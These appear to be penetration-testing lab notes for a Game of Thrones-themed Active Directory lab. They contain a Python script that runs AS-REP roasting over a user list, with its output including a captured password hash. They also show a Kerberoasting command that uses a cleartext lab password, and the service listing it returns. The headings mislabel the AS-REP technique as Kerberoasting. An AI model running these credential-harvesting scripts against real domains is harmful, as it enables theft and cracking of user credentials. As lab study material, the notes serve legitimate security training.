
# Kerberoasting


# Custom Kerberoasting script to get user & HASHes:
```bash
vi as-rep-roast
```

```python
#!/usr/bin/env python3

import argparse
import subprocess
import sys
import os

def main():
    parser = argparse.ArgumentParser(
        description='Run impacket-GetNPUsers for each user in a file (AS-REP roasting).'
    )
    parser.add_argument('-d', '--domain', required=True, help='Target domain')
    parser.add_argument('-i', '--ip', required=True, help='Domain controller IP')
    parser.add_argument('-u', '--userfile', required=True, help='File containing usernames (one per line)')
    parser.add_argument('--debug', action='store_true', help='Show full command output for each user')

    args = parser.parse_args()

    if not os.path.isfile(args.userfile):
        print(f"[!] User file '{args.userfile}' not found.")
        sys.exit(1)

    try:
        with open(args.userfile, 'r') as f:
            users = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f'[!] Error reading user file: {e}')
        sys.exit(1)

    roasted_hashes = []

    for user in users:
        cmd = [
            'impacket-GetNPUsers',
            f'{args.domain}/{user}',
            '-request',
            '-no-pass',
            '-dc-ip', args.ip
        ]
        print(f'[*] Running: {" ".join(cmd)}')
        result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)

        if args.debug:
            print(result.stdout)

        for line in result.stdout.splitlines():
            if line.strip().startswith('$krb5asrep$'):
                roasted_hashes.append(line.strip())

    if roasted_hashes:
        print(f'\n[+] {len(roasted_hashes)} hash(es) roasted:')
        for h in roasted_hashes:
            print(h)
    else:
        print('\n[-] No AS-REP roastable users found.')

if __name__ == '__main__':
    main()

```

# Running the script
Using the user list from Mimikatz that you exported previously, running the following command:

```bash
./as-rep-roast -d north.sevenkingdoms.local -i 10.2.10.11 -u ../u_users.txt
```

-d => Domain Name
-i => IP Address of the domain controller
-u => The file with the usernames

Example of results output:
```
──(digit㉿kali)-[~/Documents/Labs/GO-AD/CASTELBLACK-10.2.10.22]
└─$ ./as-rep-roast -d north.sevenkingdoms.local -i 10.2.10.11 -u ../u_users.txt 
[*] Running: impacket-GetNPUsers north.sevenkingdoms.local/Administrator -request -no-pass -dc-ip 10.2.10.11
[*] Running: impacket-GetNPUsers north.sevenkingdoms.local/DefaultAccount -request -no-pass -dc-ip 10.2.10.11
[*] Running: impacket-GetNPUsers north.sevenkingdoms.local/Guest -request -no-pass -dc-ip 10.2.10.11
[*] Running: impacket-GetNPUsers north.sevenkingdoms.local/arya.stark -request -no-pass -dc-ip 10.2.10.11
[*] Running: impacket-GetNPUsers north.sevenkingdoms.local/brandon.stark -request -no-pass -dc-ip 10.2.10.11
[*] Running: impacket-GetNPUsers north.sevenkingdoms.local/catelyn.stark -request -no-pass -dc-ip 10.2.10.11
[*] Running: impacket-GetNPUsers north.sevenkingdoms.local/daenerys.targaryen -request -no-pass -dc-ip 10.2.10.11
[*] Running: impacket-GetNPUsers north.sevenkingdoms.local/drogon -request -no-pass -dc-ip 10.2.10.11
[*] Running: impacket-GetNPUsers north.sevenkingdoms.local/eddard.stark -request -no-pass -dc-ip 10.2.10.11
[*] Running: impacket-GetNPUsers north.sevenkingdoms.local/hodor -request -no-pass -dc-ip 10.2.10.11
[*] Running: impacket-GetNPUsers north.sevenkingdoms.local/jeor.mormont -request -no-pass -dc-ip 10.2.10.11
[*] Running: impacket-GetNPUsers north.sevenkingdoms.local/jon.snow -request -no-pass -dc-ip 10.2.10.11
[*] Running: impacket-GetNPUsers north.sevenkingdoms.local/jorah.mormont -request -no-pass -dc-ip 10.2.10.11
[*] Running: impacket-GetNPUsers north.sevenkingdoms.local/khal.drogo -request -no-pass -dc-ip 10.2.10.11
[*] Running: impacket-GetNPUsers north.sevenkingdoms.local/krbtgt -request -no-pass -dc-ip 10.2.10.11
[*] Running: impacket-GetNPUsers north.sevenkingdoms.local/localuser -request -no-pass -dc-ip 10.2.10.11
[*] Running: impacket-GetNPUsers north.sevenkingdoms.local/missandei -request -no-pass -dc-ip 10.2.10.11
[*] Running: impacket-GetNPUsers north.sevenkingdoms.local/rickon.stark -request -no-pass -dc-ip 10.2.10.11
[*] Running: impacket-GetNPUsers north.sevenkingdoms.local/robb.stark -request -no-pass -dc-ip 10.2.10.11
[*] Running: impacket-GetNPUsers north.sevenkingdoms.local/samwell.tarly -request -no-pass -dc-ip 10.2.10.11
[*] Running: impacket-GetNPUsers north.sevenkingdoms.local/sansa.stark -request -no-pass -dc-ip 10.2.10.11
[*] Running: impacket-GetNPUsers north.sevenkingdoms.local/sql_svc -request -no-pass -dc-ip 10.2.10.11
[*] Running: impacket-GetNPUsers north.sevenkingdoms.local/viserys.targaryen -request -no-pass -dc-ip 10.2.10.11

[+] 1 hash(es) roasted:
$krb5asrep$23$brandon.stark@NORTH.SEVENKINGDOMS.LOCAL:45d88fa5173a6b21c4df0bd60e381b6f$92847c1ba3a0d151f917293acad5c3aaf2747832a4c2c7dabd8677477adfab12a17f1d44ef87f018a351296e20a7dde3745c537f4d8e35a794fe4ca9d4cb9a40f93c31cda41536e35b3bd212bc689ad6cdf110d2558d00ebd1e48dde11def1f86863194f00c03dfe5dc574f1575de7bd62d6030190d4c2111d161c044f2e9de5e2c3ecd48792a1b687c0fb0f52c32e623d1cdbbaf8748c8078ef5586c6b474458d38bd12ea92175f0d14f6e9dbf8b2610eb02df9f0c792fe400844b95782f8fe742f699ec4ccd620ec821a11dee2a93b93e4f3ff66adf2e4fc428608e74eb060d3878ed1e74d97b4e347efa63acc5e22a5abfc704c344d4c3ef97ffeab44b614c123bd38b344   
```


# Kerboroasting

Run the follwing scrip to get user details (You will need a valid user account)
```bash
impacket-GetUserSPNs -request -dc-ip <DomainControllerIP> <FullDomainName>/<UserName>:<UserPassword>
```

Example:
```bash
impacket-GetUserSPNs -request -dc-ip 10.2.10.11 north.sevenkingdoms.local/sql_svc:YouWillNotKerboroast1ngMeeeeee
```

Example Output:
```bash
─$ impacket-GetUserSPNs -request -dc-ip 10.2.10.11 north.sevenkingdoms.local/sql_svc:YouWillNotKerboroast1ngMeeeeee
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName                                 Name         MemberOf                                                    PasswordLastSet             LastLogon                   Delegation  
---------------------------------------------------  -----------  ----------------------------------------------------------  --------------------------  --------------------------  -----------
HTTP/eyrie.north.sevenkingdoms.local                 sansa.stark  CN=Stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local        2026-04-05 21:31:06.518053  <never>                                 
CIFS/thewall.north.sevenkingdoms.local               jon.snow     CN=Night Watch,CN=Users,DC=north,DC=sevenkingdoms,DC=local  2026-04-05 21:31:34.922894  <never>                     constrained 
HTTP/thewall.north.sevenkingdoms.local               jon.snow     CN=Night Watch,CN=Users,DC=north,DC=sevenkingdoms,DC=local  2026-04-05 21:31:34.922894  <never>                     constrained 
MSSQLSvc/castelblack.north.sevenkingdoms.local       sql_svc                                                                  2026-04-05 21:31:57.492352  2026-07-12 03:17:11.067854              
MSSQLSvc/castelblack.north.sevenkingdoms.local:1433  sql_svc                                                                  2026-04-05 21:31:57.492352  2026-07-12 03:17:11.067854              



[-] CCache file is not found. Skipping...
[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)


```